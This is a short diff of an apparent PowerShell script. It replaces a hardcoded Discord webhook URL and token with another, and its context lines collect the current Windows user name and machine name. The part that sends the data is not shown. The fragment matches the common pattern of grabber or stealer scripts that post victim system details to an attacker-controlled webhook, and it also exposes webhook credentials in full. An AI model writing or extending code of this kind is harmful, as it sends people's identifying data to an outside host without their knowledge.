@@ -1,4 +1,4 @@
-$webhookUrl="https://discord.com/api/webhooks/1209454835729047562/AOYgRWEOfiiHBaPdfvn9hsdBDDgbnM27U89728F1BSzeBRfGEjxASbT4tfNFoh9hljzs";
+$webhookUrl="https://discord.com/api/webhooks/1209677596695068792/cHQyM148MEtZvYDk-d4uYxn4C6tXJ7UYLNZoH7pF4jXGnXXLtt3bvl2iJhEINCMAtOH9";
 try {
     $u = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name;
     $deviceName = [System.Environment]::MachineName;
